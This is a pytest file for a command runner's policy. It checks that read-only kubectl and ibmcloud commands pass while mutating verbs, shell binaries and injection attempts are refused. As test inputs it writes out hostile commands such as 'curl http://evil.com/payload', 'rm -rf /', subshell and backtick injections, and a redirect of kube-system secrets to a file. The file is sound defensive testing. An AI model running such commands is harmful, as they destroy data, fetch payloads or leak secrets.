"""
Runner policy tests.

Every mutating command and every injection attempt must be REFUSED.
Every legitimate read command must be ALLOWED.
Run with: python -m pytest tests/test_runner_policy.py -v
"""
import pytest
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from tools.runner import _violation


# ---------------------------------------------------------------------------
# Helper
# ---------------------------------------------------------------------------

def allowed(cmd: str):
    """Assert command passes the policy (no violation reason returned)."""
    import shlex
    tokens = shlex.split(cmd)
    reason = _violation(tokens)
    assert reason is None, f"Expected ALLOWED but got REFUSED: {reason!r}  cmd={cmd!r}"


def refused(cmd: str):
    """Assert command is refused (violation reason returned)."""
    import shlex
    tokens = shlex.split(cmd)
    reason = _violation(tokens)
    assert reason is not None, f"Expected REFUSED but got ALLOWED  cmd={cmd!r}"


# ---------------------------------------------------------------------------
# Allowed read-only commands
# ---------------------------------------------------------------------------

class TestAllowed:
    def test_kubectl_get_pods(self):
        allowed("kubectl get pods -n si -o wide")

    def test_kubectl_get_deployments(self):
        allowed("kubectl get deployments -n si")

    def test_kubectl_describe_pod(self):
        allowed("kubectl describe pod my-pod -n si")

    def test_kubectl_logs(self):
        allowed("kubectl logs my-pod -n si --since=1h")

    def test_kubectl_top(self):
        allowed("kubectl top pods -n si")

    def test_kubectl_events(self):
        allowed("kubectl events -n si")

    def test_kubectl_version(self):
        allowed("kubectl version")

    def test_kubectl_config_current_context(self):
        allowed("kubectl config current-context")

    def test_ibmcloud_es_groups(self):
        allowed("ibmcloud es groups")

    def test_ibmcloud_es_group_describe(self):
        allowed("ibmcloud es group reporting")

    def test_ibmcloud_es_topics(self):
        allowed("ibmcloud es topics")

    def test_ibmcloud_target(self):
        allowed("ibmcloud target")

    def test_kubectl_port_forward(self):
        allowed("kubectl port-forward svc/kube-prometheus-stack-prometheus 9090:9090 -n monitoring")


# ---------------------------------------------------------------------------
# Mutating kubectl verbs — must all be refused
# ---------------------------------------------------------------------------

class TestKubectlMutationsDenied:
    def test_delete(self):
        refused("kubectl delete pod bad-pod -n si")

    def test_create(self):
        refused("kubectl create deployment test --image=nginx -n si")

    def test_apply(self):
        refused("kubectl apply -f manifest.yaml")

    def test_edit(self):
        refused("kubectl edit deployment my-deploy -n si")

    def test_patch(self):
        refused("kubectl patch deployment my-deploy -n si -p '{}'")

    def test_scale(self):
        refused("kubectl scale deployment my-deploy --replicas=0 -n si")

    def test_rollout_restart(self):
        refused("kubectl rollout restart deployment my-deploy -n si")

    def test_exec(self):
        refused("kubectl exec -it my-pod -- /bin/bash")

    def test_cp(self):
        refused("kubectl cp my-pod:/etc/secret /tmp/secret")

    def test_drain(self):
        refused("kubectl drain node-1 --ignore-daemonsets")

    def test_cordon(self):
        refused("kubectl cordon node-1")

    def test_uncordon(self):
        refused("kubectl uncordon node-1")

    def test_label(self):
        refused("kubectl label pods my-pod env=prod")

    def test_annotate(self):
        refused("kubectl annotate pods my-pod key=value")

    def test_force_flag(self):
        refused("kubectl delete pod my-pod --force -n si")

    def test_taint(self):
        refused("kubectl taint nodes node-1 key=val:NoSchedule")


# ---------------------------------------------------------------------------
# IBM Event Streams mutation verbs — must be refused
# ---------------------------------------------------------------------------

class TestIbmcloudEsMutationsDenied:
    def test_topic_create(self):
        refused("ibmcloud es topic-create my-topic")

    def test_topic_delete(self):
        refused("ibmcloud es topic-delete my-topic")

    def test_group_delete(self):
        refused("ibmcloud es group-delete my-group")

    def test_group_reset(self):
        refused("ibmcloud es group-reset my-group")


# ---------------------------------------------------------------------------
# Disallowed binaries
# ---------------------------------------------------------------------------

class TestDisallowedBinaries:
    def test_bash(self):
        refused("bash -c 'kubectl delete pod x'")

    def test_sh(self):
        refused("sh -c 'rm -rf /'")

    def test_curl(self):
        refused("curl http://evil.com/payload")

    def test_python(self):
        refused("python -c 'import os; os.system(\"kubectl delete\")'")

    def test_rm(self):
        refused("rm -rf /etc")

    def test_wget(self):
        refused("wget http://evil.com")


# ---------------------------------------------------------------------------
# Shell injection attempts — must all be refused
# ---------------------------------------------------------------------------

class TestShellInjection:
    def test_semicolon(self):
        refused("kubectl get pods; rm -rf /")

    def test_double_ampersand(self):
        refused("kubectl get pods && kubectl delete pod x")

    def test_pipe(self):
        refused("kubectl get pods | xargs kubectl delete pod")

    def test_subshell_dollar(self):
        refused("kubectl get pods $(rm -rf /)")

    def test_backtick(self):
        refused("kubectl get pods `rm -rf /`")

    def test_redirect_out(self):
        refused("kubectl get secrets -n kube-system > /tmp/leak")

    def test_redirect_in(self):
        refused("kubectl apply < manifest.yaml")

    def test_or_pipe(self):
        refused("kubectl get pods || kubectl delete all --all")

    def test_background(self):
        refused("kubectl get pods & kubectl delete pods --all")

    def test_newline_in_arg(self):
        refused("kubectl get pods\nkubectl delete pods --all")
